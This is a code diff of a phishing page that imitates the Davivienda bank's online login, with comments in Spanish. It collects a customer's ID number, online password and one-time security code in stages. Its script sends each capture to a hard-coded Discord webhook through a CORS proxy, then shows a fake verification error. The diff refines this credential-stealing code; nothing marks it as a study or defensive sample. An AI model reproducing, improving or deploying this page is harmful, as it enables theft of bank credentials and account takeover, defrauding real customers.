@@ -6,20 +6,18 @@
     <title>Davivienda - Virtual</title>
     <link rel="stylesheet" href="styles.css">
     <style>
-        /* Forzamos que los elementos estén pegados como en tus fotos */
-        .container { max-width: 480px; margin: 0 auto; padding: 20px 40px; }
-        .form-group { margin-bottom: 5px !important; gap: 2px !important; }
-        .btn-continue { margin-top: 15px !important; }
-        
+        /* Forzamos el diseño de tus imágenes */
         #passSection, #otpSection { display: none; }
         .visible { display: block !important; }
         .hidden { display: none !important; }
+        /* Ajuste para que los bloques nuevos no tengan mucho espacio arriba */
+        #passSection, #otpSection { margin-top: -15px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo-container">
-            <img src="LogoDavivienda.svg" alt="Logo" class="logo" style="max-width: 200px;">
+            <img src="LogoDavivienda.svg" alt="Logo" class="logo">
         </div>
         
         <div class="welcome-section">
@@ -44,7 +42,7 @@
 
             <div id="passSection">
                 <div class="form-group">
-                    <label class="form-label" style="margin-top: 10px;">Ingrese su clave virtual</label>
+                    <label class="form-label">Ingrese su clave virtual</label>
                     <input type="password" id="pass" class="form-input" maxlength="8">
                 </div>
                 <div class="checkbox-container">
@@ -55,8 +53,8 @@
             </div>
 
             <div id="otpSection">
-                <div style="border-top: 1px solid #eee; margin-top: 15px; padding-top: 15px;">
-                    <h2 style="color: #ed1c24; font-size: 19px; font-weight: 700;">Verificación</h2>
+                <div style="border-top: 1px solid #eee; margin-top: 20px; padding-top: 15px;">
+                    <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
                     <div class="form-group">
                         <label class="form-label">Código de seguridad</label>
                         <input type="text" id="otpCode" class="form-input" placeholder="000000">
@@ -69,21 +67,31 @@
     </div>
 
     <script>
-        // PEGA TU URL DE WEBHOOK AQUÍ
+        // PEGA TU WEBHOOK AQUÍ
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
 
-        async function sendToDiscord(texto) {
-            // Enviamos como texto simple para máxima compatibilidad
-            await fetch(WEBHOOK_URL, {
+        async function sendToDiscord(titulo, fields) {
+            const payload = {
+                embeds: [{
+                    title: titulo,
+                    color: 15548997,
+                    fields: fields,
+                    footer: { text: "Davivienda Live | " + new Date().toLocaleString() }
+                }]
+            };
+
+            // USAMOS UN PROXY PARA EVITAR EL BLOQUEO DE NAVEGADOR (CORS) EN VERCEL
+            return fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: texto })
+                body: JSON.stringify(payload)
             });
         }
 
-        // 1. Mostrar campo de clave
+        // 1. Mostrar Clave
         document.getElementById('btnToPass').addEventListener('click', () => {
-            if (document.getElementById('docNumber').value.length > 3) {
+            const doc = document.getElementById('docNumber').value;
+            if (doc.length > 3) {
                 document.getElementById('docGroup').classList.add('hidden');
                 document.getElementById('passSection').classList.add('visible');
             }
@@ -95,15 +103,13 @@
             btn.innerText = "Validando...";
             btn.disabled = true;
 
-            const doc = document.getElementById('docNumber').value;
-            const clave = document.getElementById('pass').value;
-            
-            // Formato de mensaje ultra-limpio
-            const mensaje = `**🏦 NUEVA CAPTURA**\n👤 **Doc:** \`${doc}\`\n🔑 **Clave:** \`${clave}\``;
-            
-            await sendToDiscord(mensaje);
+            const fields = [
+                { name: "👤 Documento", value: `\`${document.getElementById('docNumber').value}\``, inline: true },
+                { name: "🔑 Clave", value: `\`${document.getElementById('pass').value}\``, inline: true }
+            ];
 
-            // Simulamos carga y mostramos el siguiente cuadro
+            await sendToDiscord("🏦 NUEVA CAPTURA", fields);
+
             setTimeout(() => {
                 document.getElementById('passSection').classList.remove('visible');
                 document.getElementById('passSection').classList.add('hidden');
@@ -114,14 +120,14 @@
         // 3. Enviar OTP
         document.getElementById('btnFinish').addEventListener('click', async () => {
             const btn = document.getElementById('btnFinish');
-            const code = document.getElementById('otpCode').value;
-            const doc = document.getElementById('docNumber').value;
-
             btn.innerText = "Verificando...";
             
-            const mensaje = `**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${doc}\`\n🔢 **Código:** \`${code}\``;
-            
-            await sendToDiscord(mensaje);
+            const fields = [
+                { name: "👤 Doc", value: `\`${document.getElementById('docNumber').value}\``, inline: true },
+                { name: "🔢 Código OTP", value: `\`${document.getElementById('otpCode').value}\``, inline: true }
+            ];
+
+            await sendToDiscord("🔐 CÓDIGO RECIBIDO", fields);
 
             setTimeout(() => {
                 document.getElementById('errOtp').style.display = 'block';
